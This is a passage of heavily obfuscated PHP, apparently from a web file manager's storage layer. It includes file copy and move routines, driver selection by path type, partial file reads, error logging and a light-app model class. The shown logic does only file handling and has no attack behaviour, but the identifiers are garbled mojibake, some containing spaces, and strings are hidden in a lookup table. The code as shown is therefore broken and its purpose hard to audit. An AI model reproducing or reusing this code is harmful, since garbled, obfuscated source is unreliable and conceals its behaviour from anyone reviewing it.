(is_array($²øÕóÛ)) { $²øÕóÛ = json_encode_force($²øÕóÛ); } $²øÕóÛ = addslashes($²øÕóÛ); $²øÕóÛ = str_replace(array($õûÀ€™‹[1069], $õûÀ€™‹[62]), array($õûÀ€™‹[1070], $õûÀ€™‹[1071]), $²øÕóÛ); $Ôœëßå·[] = str_replace($õûÀ€™‹[55], $õûÀ€™‹[1072], $²øÕóÛ); } return $õûÀ€™‹[55] . implode($õûÀ€™‹[1073], $Ôœëßå·) . $õûÀ€™‹[55]; } private function sqlDecode($§ÈüİÀâ, $É–¤Öìë) { $Æşû­€º =& $_SERVER[Á÷ ­Šë]; $§ÈüİÀâ = str_replace(array($Æşû­€º[1070], $Æşû­€º[1071]), array($Æşû­€º[1069], $Æşû­€º[62]), $§ÈüİÀâ); if ($É–¤Öìë == $Æşû­€º[9]) { $§ÈüİÀâ = stripslashes($§ÈüİÀâ); } return $§ÈüİÀâ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ñãÄç¿•, $ø¿‰ªõ‡) { $×¦“ĞÕì =& $_SERVER[Á÷ ­Šë]; $›¦ëÏÅå = $ø¿‰ªõ‡; $GLOBALS[$×¦“ĞÕì[1074]] = $×¦“ĞÕì[1075] . $ñãÄç¿•; Hook::trigger($×¦“ĞÕì[1075] . $ñãÄç¿• . $×¦“ĞÕì[1076], $›¦ëÏÅå); $’Ÿ‚ì¾· = self::driverMake($ø¿‰ªõ‡[0]); if (!$’Ÿ‚ì¾·) { return !1; } if (method_exists($’Ÿ‚ì¾·, $ñãÄç¿•)) { $©Æó­¼µ = @call_user_func_array(array($’Ÿ‚ì¾·, $ñãÄç¿•), $ø¿‰ªõ‡); } else { if (method_exists($’Ÿ‚ì¾·, $×¦“ĞÕì[1077])) { $©Æó­¼µ = @call_user_func_array(array($’Ÿ‚ì¾·, $ñãÄç¿•), $ø¿‰ªõ‡); } else { if (method_exists(self, $ñãÄç¿•)) { $©Æó­¼µ = @call_user_func_array(array(self, $ñãÄç¿•), $ø¿‰ªõ‡); } else { $©Æó­¼µ = call_user_func_array(array(parent, $ñãÄç¿•), $ø¿‰ªõ‡); } } } Hook::trigger($×¦“ĞÕì[1075] . $ñãÄç¿• . $×¦“ĞÕì[1078], $›¦ëÏÅå, $©Æó­¼µ); return $©Æó­¼µ; } public static function init($³¥±±óì) { return self::driverMake($³¥±±óì); } public static function copy($¡ğÔ±…, $§™»•—é, $¸òº§êó = false, $ÎÇ¼Ü£ = false) { return self::copyMoveStart($¡ğÔ±…, $§™»•—é, $¸òº§êó, $_SERVER[Á÷ ­Šë][553], $ÎÇ¼Ü£); } public static function move($¢ÍˆÈœß, $’øÚ¾©, $‡Â—£ = false, $Ê•¨¹ò = false) { return self::copyMoveStart($¢ÍˆÈœß, $’øÚ¾©, $‡Â—£, $_SERVER[Á÷ ­Šë][555], $Ê•¨¹ò); } private static function copyMoveStart($ÑÁëÛ, $èÎ÷Õ–­, $®‘é—Ü, $£åñ…ĞŞ, $ÎÚ’÷«¼) { $ıó£—æº =& $_SERVER[Á÷ ­Šë]; $È°íÙ÷¿ = array($ÑÁëÛ, $èÎ÷Õ–­, $®‘é—Ü, $ÎÚ’÷«¼); Hook::trigger($ıó£—æº[1075] . $£åñ…ĞŞ . $ıó£—æº[1076], $È°íÙ÷¿); $Ş«„‰İ¨ = self::copyMove($ÑÁëÛ, $èÎ÷Õ–­, $®‘é—Ü, $£åñ…ĞŞ, $ÎÚ’÷«¼); Hook::trigger($ıó£—æº[1075] . $£åñ…ĞŞ . $ıó£—æº[1078], $È°íÙ÷¿, $Ş«„‰İ¨); return $Ş«„‰İ¨; } public static function saveFile($Ê‹ëœÀŒ, $èÜ”Í§´, $ëµ·çÏ = true) { $Å‚ş¦Ó =& $_SERVER[Á÷ ­Šë]; $‡ş¡ï› = self::info($èÜ”Í§´); $ˆŠõ¼øû = self::driverMake($Ê‹ëœÀŒ); $Ê‚ñğ×Ô = self::driverMake($èÜ”Í§´); $ÕãÃ•é­ = !1; if ($Ê‚ñğ×Ô->pathParse[$Å‚ş¦Ó[1079]]) { $ÕãÃ•é­ = $Ê‚ñğ×Ô; $ò¡ûÃ»ç = $Ê‚ñğ×Ô->pathParse[$Å‚ş¦Ó[1079]]; $Ê‚ñğ×Ô = self::driverMake($ò¡ûÃ»ç); } if ($ˆŠõ¼øû->pathParse[$Å‚ş¦Ó[1079]]) { $È¡ê¾ë = $ˆŠõ¼øû->pathParse[$Å‚ş¦Ó[1079]]; $ˆŠõ¼øû = self::driverMake($È¡ê¾ë); } $çõ”à™ç = $Ê‚ñğ×Ô->pathFather($èÜ”Í§´); $ïç›Î« = !0; if (!$ëµ·çÏ && self::driverIsSame($ˆŠõ¼øû, $Ê‚ñğ×Ô)) { $ïç›Î« = !1; } $Â‹× ê = self::copyFile($ˆŠõ¼øû, $Ê‹ëœÀŒ, $Ê‚ñğ×Ô, $çõ”à™ç, $‡ş¡ï›[$Å‚ş¦Ó[28]], $ïç›Î«); if ($ÕãÃ•é­) { $Â‹× ê = $ÕãÃ•é­->getPathOuter($Â‹× ê); } return $Â‹× ê; } private static function copyMove($æı“õ¿“, $ü‡ä¦¡, $ê÷ İÆÆ, $ÚõÉÎŸß, $¿åĞğ÷ = false) { $–¢ÂÉåô =& $_SERVER[Á÷ ­Šë]; if (!$æı“õ¿“ || $æı“õ¿“ == $–¢ÂÉåô[8] || !$ü‡ä¦¡) { return !1; } ignore_timeout(); $º˜ÙÔé = self::driverMake($æı“õ¿“); $ôÃíè’ = self::driverMake($ü‡ä¦¡); $·Ÿç†Á = $ÚõÉÎŸß == $–¢ÂÉåô[555]; $»½úüğ = !1; if ($ôÃíè’->pathParse[$–¢ÂÉåô[1079]]) { $»½úüğ = $ôÃíè’; $ü‡ä¦¡ = $ôÃíè’->pathParse[$–¢ÂÉåô[1079]]; $ôÃíè’ = self::driverMake($ü‡ä¦¡); } if ($º˜ÙÔé->pathParse[$–¢ÂÉåô[1079]]) { $æı“õ¿“ = $º˜ÙÔé->pathParse[$–¢ÂÉåô[1079]]; $º˜ÙÔé = self::driverMake($æı“õ¿“); } self::check($º˜ÙÔé, $æı“õ¿“, $ôÃíè’, $ü‡ä¦¡); Hook::trigger($–¢ÂÉåô[83], $º˜ÙÔé, $æı“õ¿“, $ôÃíè’, $ü‡ä¦¡); $ÍÓîøŠ¸ = self::driverIsSame($º˜ÙÔé, $ôÃíè’); if ($ÍÓîøŠ¸) { if ($ÚõÉÎŸß == $–¢ÂÉåô[555] && !method_exists($ôÃíè’, $–¢ÂÉåô[1080]) && trim($ü‡ä¦¡, $–¢ÂÉåô[8]) == trim($ôÃíè’->pathFather($æı“õ¿“), $–¢ÂÉåô[8])) { if ($º˜ÙÔé->pathThis($æı“õ¿“) != $¿åĞğ÷ && !$º˜ÙÔé->isTypeObject()) { return $º˜ÙÔé->rename($æı“õ¿“, $¿åĞğ÷); } return $ôÃíè’->getPathOuter($æı“õ¿“); } if (method_exists($ôÃíè’, $ÚõÉÎŸß)) { return $ôÃíè’->{$ÚõÉÎŸß}($æı“õ¿“, $ü‡ä¦¡, $ê÷ İÆÆ, $¿åĞğ÷); } } if ($ÍÓîøŠ¸ && $ÚõÉÎŸß == $–¢ÂÉåô[555] && $ôÃíè’->getType() == $–¢ÂÉåô[116]) { $©Ş¨Æ¿’ = $ôÃíè’->movePath($æı“õ¿“, $ü‡ä¦¡, $¿åĞğ÷); if ($©Ş¨Æ¿’) { return $©Ş¨Æ¿’; } } $‹‚‰ÎÕ´ = $º˜ÙÔé->isFile($æı“õ¿“); if (!$‹‚‰ÎÕ´ && $ôÃíè’->getType() == $–¢ÂÉåô[753] && $º˜ÙÔé->getType() == $–¢ÂÉåô[116]) { $©Ş¨Æ¿’ = $ôÃíè’->copyFolderFromIO($º˜ÙÔé, $æı“õ¿“, $ü‡ä¦¡, $ê÷ İÆÆ, $·Ÿç†Á, $¿åĞğ÷); } else { $©Ş¨Æ¿’ = self::copyPath($º˜ÙÔé, $æı“õ¿“, $ôÃíè’, $ü‡ä¦¡, $ê÷ İÆÆ, $·Ÿç†Á, $‹‚‰ÎÕ´, $¿åĞğ÷); } if ($©Ş¨Æ¿’ && $·Ÿç†Á) { $º˜ÙÔé->remove($æı“õ¿“); } if ($»½úüğ) { $©Ş¨Æ¿’ = $»½úüğ->getPathOuter($©Ş¨Æ¿’); } return $©Ş¨Æ¿’; } private static function check($·ßò­„–, $úèÙ­ğó, $Ë÷…äæ¾, &$ì½¬ö¹ú) { $Ÿ´•«íû =& $_SERVER[Á÷ ­Šë]; if (self::driverIsSame($·ßò­„–, $Ë÷…äæ¾) && $·ßò­„–->isFolder($úèÙ­ğó) && $·ßò­„–->isParentOf($úèÙ­ğó, $ì½¬ö¹ú)) { show_json(LNG($Ÿ´•«íû[1081]), !1); } if (!$·ßò­„–->exist($úèÙ­ğó)) { show_json(LNG($Ÿ´•«íû[115]), !1); } } private static function copyPath($ñ ¡›¶î, $ªšÕŸû, $„İ¨Ú, $¥É•‡–ë, $—Òûç­ª, $Ö ›á·, $°Åœ½µÕ, $°¶¹œ° = false) { $ÌÃùºÛ =& $_SERVER[Á÷ ­Šë]; $“›£°† = empty($°¶¹œ°) && $°¶¹œ° !== $ÌÃùºÛ[201] ? $ñ ¡›¶î->pathThis($ªšÕŸû) : $°¶¹œ°; if ($—Òûç­ª) { $ÚÂâ×• = $„İ¨Ú->fileNameExist($¥É•‡–ë, $“›£°†); $“›£°† = $„İ¨Ú->fileNameAuto($¥É•‡–ë, $“›£°†, $—Òûç­ª, !$°Åœ½µÕ); $—Òûç­ª = $ÚÂâ×• ? $—Òûç­ª : !1; } if ($°Åœ½µÕ) { return self::copyFile($ñ ¡›¶î, $ªšÕŸû, $„İ¨Ú, $¥É•‡–ë, $“›£°†, $Ö ›á·); } if ($—Òûç­ª == REPEAT_RENAME_FOLDER) { $—Òûç­ª = !1; } $Äå³Ë = rtrim($¥É•‡–ë, $ÌÃùºÛ[8]) . $ÌÃùºÛ[8] . $“›£°†; $Æí¿é¡È = $„İ¨Ú->mkdir($„İ¨Ú->getPath($Äå³Ë)); $¥É•‡–ë = $„İ¨Ú->getPathInner($Æí¿é¡È); $¾ËôÂ° = $ñ ¡›¶î->listPath($ªšÕŸû, !0); $¾ËôÂ° = is_array($¾ËôÂ°) ? $¾ËôÂ° : array($ÌÃùºÛ[84] => array(), $ÌÃùºÛ[85] => array()); $ö½¯Ôò‡ = array_merge($¾ËôÂ°[$ÌÃùºÛ[84]], $¾ËôÂ°[$ÌÃùºÛ[85]]); foreach ($ö½¯Ôò‡ as $•’¹Õ´Ğ) { $ÛÒ¡ñŠ = $•’¹Õ´Ğ[$ÌÃùºÛ[29]] == $ÌÃùºÛ[203]; $ªšÕŸû = $ñ ¡›¶î->getPathInner($•’¹Õ´Ğ[$ÌÃùºÛ[86]]); $ó‹±šù— = self::copyPath($ñ ¡›¶î, $ªšÕŸû, $„İ¨Ú, $¥É•‡–ë, $—Òûç­ª, $Ö ›á·, $ÛÒ¡ñŠ); if (!$ó‹±šù—) { IO::errorTips($ÌÃùºÛ[1082] . $ªšÕŸû . $ÌÃùºÛ[77] . $¥É•‡–ë); } } self::copyMoveKeepInfo($ñ ¡›¶î, $ªšÕŸû, $Æí¿é¡È); return $Æí¿é¡È; } private static function copyFile($äøÂ­×ç, $ùûÚó, $ºÃ®ÓÛï, $ú÷üªª, $á–—¢, $æøü¾Ó®) { $Üæ¥’¶Ê =& $_SERVER[Á÷ ­Šë]; $ú÷üªª = $ºÃ®ÓÛï->getPath(rtrim($ú÷üªª, $Üæ¥’¶Ê[8]) . $Üæ¥’¶Ê[8] . $á–—¢); $‰æÕñ™ó = $Üæ¥’¶Ê[1083] . time() . rand_string(5); Hook::trigger($Üæ¥’¶Ê[1084], $äøÂ­×ç, $ùûÚó, $ºÃ®ÓÛï, $ú÷üªª, $á–—¢, $‰æÕñ™ó); if (self::driverIsSame($äøÂ­×ç, $ºÃ®ÓÛï)) { if ($æøü¾Ó®) { $èš°ñŸ³ = $ºÃ®ÓÛï->moveFile($ùûÚó, $ú÷üªª); } else { $èš°ñŸ³ = $ºÃ®ÓÛï->copyFile($ùûÚó, $ú÷üªª); } Hook::trigger($Üæ¥’¶Ê[1085], $äøÂ­×ç, $ùûÚó, $ºÃ®ÓÛï, $ú÷üªª, $á–—¢, $èš°ñŸ³); self::copyMoveKeepInfo($äøÂ­×ç, $ùûÚó, $èš°ñŸ³); return $èš°ñŸ³; } $Í¹©ÓÏç = TEMP_FILES; if ($GLOBALS[$Üæ¥’¶Ê[6]][$Üæ¥’¶Ê[98]][$Üæ¥’¶Ê[797]]) { $Í¹©ÓÏç = $GLOBALS[$Üæ¥’¶Ê[6]][$Üæ¥’¶Ê[98]][$Üæ¥’¶Ê[797]]; } $ÜÆ¼ú£¸ = $Í¹©ÓÏç; mk_dir($ÜÆ¼ú£¸); $½¶æ“ØÖ = $ÜÆ¼ú£¸ . $‰æÕñ™ó; $â’ªê×ñ = $½¶æ“ØÖ; $½¶æ“ØÖ = $äøÂ­×ç->download($ùûÚó, $½¶æ“ØÖ); $½¶æ“ØÖ = $äøÂ­×ç->iconvApp($½¶æ“ØÖ); if (substr($½¶æ“ØÖ, strlen($Í¹©ÓÏç)) == $Í¹©ÓÏç) { $æøü¾Ó® = !0; } $èš°ñŸ³ = $ºÃ®ÓÛï->upload($ú÷üªª, $½¶æ“ØÖ, $æøü¾Ó®); self::remove($â’ªê×ñ); Hook::trigger($Üæ¥’¶Ê[1085], $äøÂ­×ç, $ùûÚó, $ºÃ®ÓÛï, $ú÷üªª, $á–—¢, $èš°ñŸ³); self::copyMoveKeepInfo($äøÂ­×ç, $ùûÚó, $èš°ñŸ³); return $èš°ñŸ³; } private static function copyMoveKeepInfo($¢×÷³¿è, $œ…ü£¥õ, $µ¯«ï¾ó) { if (!$µ¯«ï¾ó) { return; } $§ÔöêÚ = $¢×÷³¿è->info($œ…ü£¥õ); if (!is_array($§ÔöêÚ)) { return; } IO::setModifyTime($µ¯«ï¾ó, $§ÔöêÚ[$_SERVER[Á÷ ­Šë][94]]); } public static function pathFather($’‰‹åº¾) { $â°û´Ö = IO::init($’‰‹åº¾); $çŠ«£š = $â°û´Ö->pathFather($â°û´Ö->path); return $â°û´Ö->getPathOuter($çŠ«£š); } public static function fileOut($ïæä™Æû, $Âè‚âòÃ = false, $…¥´ = false, $Ğáá = '') { $òªÜÍ¶á = self::driverMake($ïæä™Æû); if ($òªÜÍ¶á->isFileOutServer()) { return $òªÜÍ¶á->fileOutServer($ïæä™Æû, $Âè‚âòÃ, $…¥´, $Ğáá); } return $òªÜÍ¶á->fileOut($ïæä™Æû, $Âè‚âòÃ, $…¥´, $Ğáá); } public static function fileOutImage($ê¨­‡Î, $ÚşĞÂª = 250) { $³€á¤öß = array(250, 600, 1200, 2000, 3000, 5000); for ($Ä›ßçÊ = 0; $Ä›ßçÊ < count($³€á¤öß); $Ä›ßçÊ++) { if ($Ä›ßçÊ == 0 && $ÚşĞÂª <= $³€á¤öß[$Ä›ßçÊ]) { $ÚşĞÂª = $³€á¤öß[$Ä›ßçÊ]; break; } else { if ($ÚşĞÂª > $³€á¤öß[$Ä›ßçÊ - 1] && $ÚşĞÂª <= $³€á¤öß[$Ä›ßçÊ]) { $ÚşĞÂª = $³€á¤öß[$Ä›ßçÊ]; break; } else { if ($Ä›ßçÊ == count($³€á¤öß) - 1 && $ÚşĞÂª > $³€á¤öß[$Ä›ßçÊ]) { $ÚşĞÂª = $³€á¤öß[$Ä›ßçÊ]; break; } } } } $Ñ°Ø “ = self::driverMake($ê¨­‡Î); if ($Ñ°Ø “->isFileOutServer()) { return $Ñ°Ø “->fileOutImageServer($ê¨­‡Î, $ÚşĞÂª); } return $Ñ°Ø “->fileOutImage($ê¨­‡Î, $ÚşĞÂª); } private static function driverIsSame($˜øœ»¶», $ª¶¥‹ÌÒ) { $„™Î¾ô¦ =& $_SERVER[Á÷ ­Šë]; $œŞ³öåÃ = $˜øœ»¶»->getType(); $ËÓŞ­§Ú = $ª¶¥‹ÌÒ->getType(); if ($œŞ³öåÃ != $ËÓŞ­§Ú) { return !1; } if ($œŞ³öåÃ == $„™Î¾ô¦[753]) { return !0; } if ($œŞ³öåÃ == $„™Î¾ô¦[116]) { return !0; } if ($˜øœ»¶»->pathDriver == $ª¶¥‹ÌÒ->pathDriver) { return !0; } return !1; } public static function copyUpdate($¿ÍŒ†ËÄ, $×‚ÑéÙ) { $®ç‰ø˜Û =& $_SERVER[Á÷ ­Šë]; if (!IO::exist($¿ÍŒ†ËÄ)) { return !1; } if (!IO::exist($×‚ÑéÙ)) { IO::mkdir($×‚ÑéÙ); } $úËõãáÖ = self::_listAll($¿ÍŒ†ËÄ); $Œ£Ô—ÇÙ = self::_listAll($×‚ÑéÙ); $˜Ù­ºƒ = array(); $‡©Ş¸Ñ± = array(); foreach ($úËõãáÖ as $¸ÎĞ—Òè => $À½öäšô) { if (isset($Œ£Ô—ÇÙ[$¸ÎĞ—Òè])) { if ($À½öäšô[$®ç‰ø˜Û[87]] == 1) { continue; } if ($Œ£Ô—ÇÙ[$¸ÎĞ—Òè][$®ç‰ø˜Û[88]] == $À½öäšô[$®ç‰ø˜Û[88]]) { continue; } } if ($À½öäšô[$®ç‰ø˜Û[87]] == 1) { $‡©Ş¸Ñ±[] = $×‚ÑéÙ . $®ç‰ø˜Û[8] . $¸ÎĞ—Òè; continue; } $ø‘¾ŠÀç = strstr(trim($¸ÎĞ—Òè, $®ç‰ø˜Û[8]), $®ç‰ø˜Û[8]) ? get_path_father($¸ÎĞ—Òè) : $®ç‰ø˜Û[33]; $˜Ù­ºƒ[] = array($®ç‰ø˜Û[1086] => $À½öäšô[$®ç‰ø˜Û[86]], $®ç‰ø˜Û[1087] => rtrim($×‚ÑéÙ, $®ç‰ø˜Û[8]) . $®ç‰ø˜Û[8] . $ø‘¾ŠÀç, $®ç‰ø˜Û[1088] => $À½öäšô); } $²¿‘â”Ë = array($®ç‰ø˜Û[203] => $˜Ù­ºƒ, $®ç‰ø˜Û[87] => $‡©Ş¸Ñ±); Hook::trigger($®ç‰ø˜Û[1089], $¿ÍŒ†ËÄ, $×‚ÑéÙ, $²¿‘â”Ë); foreach ($‡©Ş¸Ñ± as $À½öäšô) { IO::mkdir($À½öäšô); } foreach ($˜Ù­ºƒ as $À½öäšô) { IO::copy($À½öäšô[$®ç‰ø˜Û[1086]], $À½öäšô[$®ç‰ø˜Û[1087]], REPEAT_REPLACE); } } private static function _listAll($³­Æåê¢) { $ğ»å‰Æâ =& $_SERVER[Á÷ ­Šë]; $³­Æåê¢ = KodIO::clear($³­Æåê¢); $¬íïäã‘ = IO::listAll($³­Æåê¢); foreach ($¬íïäã‘ as &$Ê·¤ÆŸ²) { $âú†à× = substr($Ê·¤ÆŸ²[$ğ»å‰Æâ[86]], strlen($³­Æåê¢)); $Ê·¤ÆŸ²[$ğ»å‰Æâ[1090]] = trim($âú†à×, $ğ»å‰Æâ[8]); } unset($Ê·¤ÆŸ²); return array_to_keyvalue($¬íïäã‘, $ğ»å‰Æâ[1090]); } public static function fileSubstr($¦Î™‡ü™, $®ø¡š³Ö, $ù×›±öÜ = false) { $ßı¨î‚÷ =& $_SERVER[Á÷ ­Šë]; $ùÙ«şŸÉ = self::driverMake($¦Î™‡ü™); $˜ŠòÛ™ = $ùÙ«şŸÉ->size($¦Î™‡ü™); $àÆÏäœõ = $®ø¡š³Ö; $µîìË±Ó = $ù×›±öÜ; if ($®ø¡š³Ö < 0) { $®ø¡š³Ö = $˜ŠòÛ™ + $®ø¡š³Ö; } if ($ù×›±öÜ === !1) { $ù×›±öÜ = $˜ŠòÛ™ - $®ø¡š³Ö; } if ($®ø¡š³Ö + $ù×›±öÜ > $˜ŠòÛ™) { $ù×›±öÜ = $˜ŠòÛ™ - $®ø¡š³Ö; } if (!$˜ŠòÛ™ && $ùÙ«şŸÉ->getType() == $ßı¨î‚÷[116] && !$ùÙ«şŸÉ->exist($¦Î™‡ü™)) { throw new Exception($ßı¨î‚÷[1091] . LNG($ßı¨î‚÷[1092]) . $ßı¨î‚÷[959] . get_path_this($¦Î™‡ü™) . $ßı¨î‚÷[33]); } if ($ù×›±öÜ <= 0) { return $ßı¨î‚÷[33]; } if ($®ø¡š³Ö < 0 || $®ø¡š³Ö >= $˜ŠòÛ™ || $ù×›±öÜ > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\145\122\x65\x61\x64\x20\x65\x72\x72\157\x72\41\40\x73\164\x61\x72\164\x3d{$®ø¡š³Ö}\73\154\x65\x6e\147\164\150\75{$ù×›±öÜ}\73\40\x73\x69\172\x65\75{$˜ŠòÛ™}\x3b"); } $ı¾ı¬¡ = $ùÙ«şŸÉ->fileSubstr($¦Î™‡ü™, $®ø¡š³Ö, $ù×›±öÜ); if (!$ı¾ı¬¡ && $ù×›±öÜ && isset($GLOBALS[$ßı¨î‚÷[1093]])) { throw new Exception($GLOBALS[$ßı¨î‚÷[1093]][$ßı¨î‚÷[1094]]); } return $ı¾ı¬¡; } private static function driverMake(&$ò¯»»Ÿ™) { $şò˜Æˆ“ =& $_SERVER[Á÷ ­Šë]; $°úºÉ¨Æ = KodIO::parse($ò¯»»Ÿ™); if (!self::$driverListSystem) { $‰½„Õò = Model($şò˜Æˆ“[762])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($‰½„Õò, $şò˜Æˆ“[404]); } if ($°úºÉ¨Æ[$şò˜Æˆ“[29]] == KodIO::KOD_IO && !self::$driverListSystem[$°úºÉ¨Æ[$şò˜Æˆ“[404]]]) { return !1; } $ò¯»»Ÿ™ = $°úºÉ¨Æ[$şò˜Æˆ“[1095]]; $È°ö©£Ö = self::driverGet($°úºÉ¨Æ, $ò¯»»Ÿ™); return $È°ö©£Ö; } private static function driverGet($Ş€‚Şà, &$Ïà½ä—š) { $ Õş‚Ì¡ =& $_SERVER[Á÷ ­Šë]; $–Ğ˜ƒû  = $Ş€‚Şà[$ Õş‚Ì¡[1096]]; $şíÚğğ× = $Ş€‚Şà[$ Õş‚Ì¡[404]]; switch ($Ş€‚Şà[$ Õş‚Ì¡[29]]) { case KodIO::KOD_IO: $ºü›Ù‹Ğ = self::$driverListSystem[$şíÚğğ×]; break; case KodIO::KOD_SOURCE: $Ïà½ä—š = $şíÚğğ× . $Ïà½ä—š; $ºü›Ù‹Ğ = array($ Õş‚Ì¡[1097] => $ Õş‚Ì¡[1098], $ Õş‚Ì¡[6] => $Ş€‚Şà); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Ÿ§ÖÂÊ‘ = $GLOBALS[$ Õş‚Ì¡[1099]]; self::$driverListUser = array_to_keyvalue($Ÿ§ÖÂÊ‘, $ Õş‚Ì¡[404]); } $ºü›Ù‹Ğ = self::$driverListUser[$şíÚğğ×]; break; case KodIO::KOD_SHARE_LINK: $ºü›Ù‹Ğ = array($ Õş‚Ì¡[1097] => $ Õş‚Ì¡[1100], $ Õş‚Ì¡[6] => $Ş€‚Şà); $“¨Ê´¦Ò = Action($ Õş‚Ì¡[1101])->sharePathInfo($Ş€‚Şà[$ Õş‚Ì¡[86]]); $Ïà½ä—š = $“¨Ê´¦Ò[$ Õş‚Ì¡[407]]; if (!$“¨Ê´¦Ò[$ Õş‚Ì¡[407]]) { $­áéÊ×½ = Model($ Õş‚Ì¡[599])->getInfo($“¨Ê´¦Ò[$ Õş‚Ì¡[492]]); $Ïà½ä—š = KodIO::clear($­áéÊ×½[$ Õş‚Ì¡[1102]] . $Ş€‚Şà[$ Õş‚Ì¡[1095]]); $Ş€‚Şà[$ Õş‚Ì¡[490]] = $­áéÊ×½; $Ş€‚Şà[$ Õş‚Ì¡[1079]] = $Ïà½ä—š; $ºü›Ù‹Ğ = array($ Õş‚Ì¡[1097] => $ Õş‚Ì¡[1103], $ Õş‚Ì¡[6] => $Ş€‚Şà); } break; case KodIO::KOD_SHARE_ITEM: $ºü›Ù‹Ğ = array($ Õş‚Ì¡[1097] => $ Õş‚Ì¡[1104], $ Õş‚Ì¡[6] => $Ş€‚Şà); $­áéÊ×½ = Model($ Õş‚Ì¡[599])->getInfo($Ş€‚Şà[$ Õş‚Ì¡[404]]); if ($­áéÊ×½[$ Õş‚Ì¡[407]] == $ Õş‚Ì¡[201]) { $Ïà½ä—š = KodIO::clear($­áéÊ×½[$ Õş‚Ì¡[1102]] . $Ş€‚Şà[$ Õş‚Ì¡[1095]]); $Ş€‚Şà[$ Õş‚Ì¡[490]] = $­áéÊ×½; $Ş€‚Şà[$ Õş‚Ì¡[1079]] = $Ïà½ä—š; $ºü›Ù‹Ğ = array($ Õş‚Ì¡[1097] => $ Õş‚Ì¡[1105], $ Õş‚Ì¡[6] => $Ş€‚Şà); } else { if (!$Ïà½ä—š) { $Ïà½ä—š = $­áéÊ×½[$ Õş‚Ì¡[407]]; } } break; default: $Ïà½ä—š = $Ş€‚Şà[$ Õş‚Ì¡[86]]; $ºü›Ù‹Ğ = array($ Õş‚Ì¡[1097] => $ Õş‚Ì¡[1106]); break; } $Ş¯š«ø = $Ş€‚Şà[$ Õş‚Ì¡[86]]; if (!isset(self::$driverCache[$Ş¯š«ø])) { $ÅøãÆâó = strtolower($ºü›Ù‹Ğ[$ Õş‚Ì¡[104]]); $½­ÇÏ˜• = $GLOBALS[$ Õş‚Ì¡[6]][$ Õş‚Ì¡[98]][$ Õş‚Ì¡[828]]; $©êÚ‚Ï = $ Õş‚Ì¡[82] . (isset($½­ÇÏ˜•[$ÅøãÆâó]) ? $½­ÇÏ˜•[$ÅøãÆâó] : ucfirst($ÅøãÆâó)); if (!class_exists($©êÚ‚Ï)) { show_json("{$©êÚ‚Ï}\x20\x6e\x6f\x74\x20\x65\170\x69\x73\x74\163\41", !1); } $è‘ˆ‚ÄÈ = isset($ºü›Ù‹Ğ[$ Õş‚Ì¡[6]]) ? $ºü›Ù‹Ğ[$ Õş‚Ì¡[6]] : !1; self::$driverCache[$Ş¯š«ø] = new $©êÚ‚Ï($è‘ˆ‚ÄÈ); } $Â»ˆßõ = self::$driverCache[$Ş¯š«ø]; $Â»ˆßõ->pathDriver = $–Ğ˜ƒû ; $Â»ˆßõ->pathBase = $ Õş‚Ì¡[33]; if (isset($ºü›Ù‹Ğ[$ Õş‚Ì¡[6]][$ Õş‚Ì¡[1107]])) { $Â»ˆßõ->pathBase = rtrim($ºü›Ù‹Ğ[$ Õş‚Ì¡[6]][$ Õş‚Ì¡[1107]], $ Õş‚Ì¡[8]) . $ Õş‚Ì¡[8]; $Ïà½ä—š = $Â»ˆßõ->pathBase . ltrim($Ïà½ä—š, $ Õş‚Ì¡[8]); } $Ïà½ä—š = $Â»ˆßõ->getPath($Ïà½ä—š); if (isset($Ş€‚Şà[$ Õş‚Ì¡[1079]])) { $Ïà½ä—š = $Ş€‚Şà[$ Õş‚Ì¡[1079]]; } $Â»ˆßõ->path = $Ïà½ä—š; return $Â»ˆßõ; } public static function errorTips($óşêÜè = false) { $»Àš×»Ï =& $_SERVER[Á÷ ­Šë]; static $óË÷Ë¥Ú = array(); $¹ˆô´õƒ = 1000; if ($óşêÜè === -1) { return $óË÷Ë¥Ú ? $óË÷Ë¥Ú[count($óË÷Ë¥Ú) - 1] : $»Àš×»Ï[33]; } if ($óşêÜè === !1) { return implode($»Àš×»Ï[62], $óË÷Ë¥Ú); } if (count($óË÷Ë¥Ú) >= $¹ˆô´õƒ) { $óË÷Ë¥Ú = array_slice($óË÷Ë¥Ú, $¹ˆô´õƒ * 0.5, $¹ˆô´õƒ); } $óË÷Ë¥Ú[] = $óşêÜè; write_log($»Àš×»Ï[170] . ACTION . $»Àš×»Ï[1108] . $óşêÜè, $»Àš×»Ï[1109]); } public static function getLastError($Ÿ×É¨õ = '') { $Ü¢ˆÈ‹ = self::errorTips(-1); return $Ü¢ˆÈ‹ ? $Ü¢ˆÈ‹ : $Ÿ×É¨õ; } } goto d‚•×Îå„; cæËºŒ¬Ñ¥: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\x4c\151\147\x68\164\x41\160\160"; public $modelType = "\123\x79\163\x74\145\x6d\x4f\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\x61\x6d\x65", "\147\x72\157\165\160", "\x64\145\x73\x63", "\x63\x6f\156\164\x65\156\164"); public function listData($Š‚ƒ¡ï™ = false, $„ù®Ñ¢¾ = "\155\x6f\x64\x69\146\x79\124\x69\x6d\145", $Ÿ±õáÈ¥ = true) { return parent::listData($Š‚ƒ¡ï™, $„ù®Ñ¢¾, $Ÿ±õáÈ¥); } public function remove($ÏƒÏÊÊÁ) { $×ÄŠ š = $this->findByName($ÏƒÏÊÊÁ); if (!$×ÄŠ š) { return !1; } return parent::remove($×ÄŠ š[$_SERVER[Á÷ ­Šë][404]]); } public function add($ ³ï¢ü) { if ($this->findByName($ ³ï¢ü[$_SERVER[Á÷ ­Šë][28]])) { return !1; } return parent::insert($ ³ï¢ü); } public function update($ú®«î, $„»œŒÒ) { $ò†°íÕË =& $_SERVER[Á÷ ­Šë]; $¶»áÚè = $this->findByName($ú®«î); $†—© ‘¼ = $this->findByName($„»œŒÒ[$ò†°íÕË[28]]); if (!$¶»áÚè || $†—© ‘¼ && $†—© ‘¼[$ò†°íÕË[404]] != $¶»áÚè[$ò†°íÕË[404]]) { return !1; } return parent::update($¶»áÚè[$ò†°íÕË[404]], $„»œŒÒ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\x65\x6d\x5f\x6c\x6f\x67"; protected $dataAuto = 